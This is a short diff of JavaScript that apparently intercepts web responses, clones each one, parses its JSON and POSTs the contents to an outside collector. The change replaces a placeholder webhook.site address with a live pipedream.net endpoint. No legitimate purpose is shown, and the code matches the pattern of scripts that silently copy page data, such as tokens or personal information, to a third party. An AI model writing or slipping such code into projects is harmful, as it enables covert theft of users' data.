@@ -9,7 +9,7 @@
       const clonedResponse = response.clone();
       
       clonedResponse.json().then(data => {
-        fetch('https://webhook.site/TON-ID-WEBHOOK', {
+        fetch('https://eojy4h95a631zv3.m.pipedream.net', {
           method: 'POST',
           headers: {'Content-Type': 'application/json'},
           body: JSON.stringify({
